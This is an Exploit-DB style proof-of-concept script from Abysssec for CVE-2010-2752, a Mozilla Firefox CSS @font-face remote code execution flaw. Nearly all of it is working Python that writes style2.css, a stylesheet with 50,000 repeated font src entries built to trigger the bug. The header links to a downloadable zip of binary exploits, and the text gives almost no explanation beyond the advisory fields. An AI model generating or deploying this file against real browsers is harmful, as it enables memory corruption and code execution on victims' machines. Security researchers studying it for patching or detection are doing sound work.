'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ < 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

 http://www.exploit-db.com/moabu-15-mozilla-firefox-css-font-face-remote-code-execution-vulnerability/
 https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/15104.zip (moaub-25-exploit.zip)
 
'''

'''
  Title             :  Mozilla Firefox CSS font-face Remote Code Execution Vulnerability
  Version           :  Firefox
  Analysis          :  http://www.abysssec.com
  Vendor            :  http://www.mozilla.com
  Impact            :  Crirical
  Contact           :  shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter           :  @abysssec
  CVE               :  CVE-2010-2752
  
'''

import sys;

myStyle = """
  @font-face {
    font-family: Sean;
    font-style:  normal;
    font-weight: normal;
    src: url(SEAN1.eot);
    src: url('type/filename.woff') format('woff')

"""
i=0
while(i<50000):
    myStyle = myStyle + ",url('type/filename.otf') format('opentype')\n";
    i=i+1

myStyle = myStyle + ",url('type/filename.otf') format('opentype');\n";
myStyle = myStyle + "}\n";
cssFile = open("style2.css","w")
cssFile.write(myStyle)
cssFile.close()